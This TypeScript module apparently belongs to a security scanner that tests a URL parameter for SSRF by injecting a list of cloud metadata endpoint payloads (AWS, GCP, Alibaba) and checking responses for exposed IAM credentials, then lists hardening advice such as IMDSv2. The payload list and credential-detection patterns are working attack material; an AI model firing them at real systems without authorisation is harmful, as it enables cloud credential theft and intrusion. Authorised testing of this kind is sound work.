import { performance } from 'node:perf_hooks';
import { logToolActivity } from '../utils/activityLogger.js';

export interface AWSMetaResult {
  url: string;
  vulnerable: boolean;
  successfulPayload?: string;
  sensitiveDataFound: boolean;
  credentialsExposed: boolean;
  payloadResults: Array<{ payload: string; reached: boolean; dataFound?: string }>;
  recommendations: string[];
}

const IMDS_PAYLOADS = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://[fd00:ec2::254]/latest/meta-data/',
  'http://instance-data/latest/meta-data/',
  'http://169.254.169.254/latest/user-data/',
  'http://169.254.169.254/latest/dynamic/instance-identity/document',
  '//169.254.169.254/latest/meta-data/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://100.100.100.200/latest/meta-data/',
];

async function testIMDSPayload(
  baseUrl: string,
  parameter: string,
  payload: string,
  timeoutMs: number
): Promise<{ reached: boolean; dataFound?: string }> {
  try {
    const url = new URL(baseUrl);
    url.searchParams.set(parameter, payload);

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);

    const res = await fetch(url.toString(), {
      signal: controller.signal,
      redirect: 'follow',
    });
    clearTimeout(timer);

    const body = await res.text();

    const credentialPatterns = [
      /AccessKeyId/i,
      /SecretAccessKey/i,
      /Token/i,
      /ami-id/i,
      /instance-id/i,
      /IAM:/i,
    ];

    const sensitivePattern = credentialPatterns.find((p) => p.test(body));
    const dataFound = sensitivePattern ? `Sensitive data detected: ${body.substring(0, 200)}` : undefined;

    return { reached: res.status < 500, dataFound };
  } catch {
    return { reached: false };
  }
}

export async function testAWSMetadata(
  url: string,
  parameter: string,
  timeoutMs: number = 10000
): Promise<AWSMetaResult> {
  const start = performance.now();
  logToolActivity('AWS Metadata Tester', `Testing SSRF on ${url}`, 'info');

  const payloadResults: AWSMetaResult['payloadResults'] = [];
  let successfulPayload: string | undefined;
  let credentialsExposed = false;

  for (const payload of IMDS_PAYLOADS) {
    const result = await testIMDSPayload(url, parameter, payload, Math.min(timeoutMs / 3, 3000));
    payloadResults.push({ payload, ...result });

    if (result.reached && !successfulPayload) {
      successfulPayload = payload;
    }

    if (result.dataFound?.toLowerCase().includes('accesskeyid') ||
        result.dataFound?.toLowerCase().includes('secretaccesskey')) {
      credentialsExposed = true;
    }
  }

  const vulnerable = successfulPayload !== undefined;
  const sensitiveDataFound = payloadResults.some((r) => r.dataFound);

  const recommendations = [
    'Enable IMDSv2 (Instance Metadata Service v2) which requires session tokens',
    'Implement strict input validation to reject internal IP addresses and hostnames',
    'Use allowlists for redirect destinations and URL parameters',
    'Block outbound requests to 169.254.169.254 at the network/firewall level',
    'Monitor and alert on unusual outbound requests from application servers',
    'Apply the principle of least privilege to IAM roles',
  ];

  logToolActivity('AWS Metadata Tester', `Test complete — vulnerable: ${vulnerable}`, vulnerable ? 'warning' : 'success');

  return {
    url,
    vulnerable,
    successfulPayload,
    sensitiveDataFound,
    credentialsExposed,
    payloadResults,
    recommendations,
  };
}
